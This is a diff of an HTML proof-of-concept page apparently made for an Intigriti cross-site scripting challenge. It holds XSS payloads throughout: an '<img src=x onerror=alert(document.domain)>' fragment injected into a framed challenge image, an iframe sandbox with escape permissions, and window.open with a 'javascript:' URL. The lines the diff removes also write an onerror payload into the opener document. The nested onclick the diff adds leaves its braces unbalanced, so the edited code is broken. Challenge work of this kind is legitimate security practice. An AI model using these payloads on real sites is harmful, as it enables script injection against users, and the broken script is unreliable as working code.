@@ -7,13 +7,11 @@
     iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png\#<img src=x onerror=alert(document.domain)>'
     iframe.sandbox = 'allow-popups allow-forms allow-same-origin allow-scripts allow-top-navigation allow-popups-to-escape-sandbox'
     iframe.onclick = function(e){
-        var myWindow = window.open(this.contentWindow.name, 'javascript:alert(document.domain)');
-        myWindow.opener.document.write('<img src=x onerror=alert(document.domain)>')
+        window.history.back();
+        iframe.onclick = function(e){
+        window.open(this.contentWindow.name, this.src);
     }
     document.body.appendChild(iframe);
-    window.history.back();
-    var myWindow = window.open(this.contentWindow.name, 'javascript:alert(document.domain)');
-    myWindow.opener.document.write('<img src=x onerror=alert(document.domain)>')
   </script>
   <a href="https://challenge.intigriti.io/" target="_blank" onload="alert(111)">PoC</a>
 </body>
